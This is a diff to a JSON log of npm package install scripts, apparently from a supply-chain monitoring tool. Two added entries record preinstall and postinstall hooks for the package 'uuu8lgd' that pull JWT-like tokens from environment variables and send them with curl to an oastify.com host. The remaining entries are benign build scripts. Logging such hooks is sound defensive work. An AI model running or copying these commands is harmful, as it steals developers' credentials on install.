@@ -1,5 +1,41 @@
 [
   {
+    "packageName": "uuu8lgd",
+    "version": "1.0.6",
+    "scriptType": "postinstall",
+    "scriptContent": "sh -c 'env | grep -oE \"eyJh[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+\" | xargs -I {} curl -s \"http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?env_jwt={}\"'",
+    "previousVersion": "1.0.5",
+    "timestamp": "2026-01-22T18:07:15.124Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "uuu8lgd",
+    "version": "1.0.6",
+    "scriptType": "preinstall",
+    "scriptContent": "sh -c 'env | grep -oE \"eyJh[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+\" | xargs -I {} curl -s \"http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?env_jwt={}\"'",
+    "previousVersion": "1.0.5",
+    "timestamp": "2026-01-22T18:07:15.122Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "recursive-llm-ts",
+    "version": "3.0.1",
+    "scriptType": "postinstall",
+    "scriptContent": "node scripts/build-go-binary.js",
+    "previousVersion": "2.0.12",
+    "timestamp": "2026-01-22T18:03:48.458Z",
+    "issuesend": true
+  },
+  {
+    "packageName": "recursive-llm-ts",
+    "version": "3.0.1",
+    "scriptType": "postinstall",
+    "scriptContent": "node scripts/build-go-binary.js",
+    "previousVersion": "2.0.12",
+    "timestamp": "2026-01-22T18:02:54.718Z",
+    "issuesend": true
+  },
+  {
     "packageName": "pughost",
     "version": "0.0.1",
     "scriptType": "postinstall",
